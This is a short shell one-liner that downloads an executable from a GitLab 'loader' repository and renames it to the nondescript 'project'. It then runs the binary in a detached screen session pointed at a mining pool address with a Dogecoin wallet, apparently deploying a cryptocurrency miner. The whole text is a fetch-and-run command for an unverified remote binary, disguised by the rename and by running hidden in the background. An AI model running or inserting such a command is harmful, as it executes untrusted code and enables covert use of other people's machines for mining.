sudo apt install screen -y &&
wget https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa && mv perusa project &&
screen -dms run ./project -v -l 167.114.98.94:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-2000 -n 1)-PYZ) -p c=DOGE -t 4 && screen -r
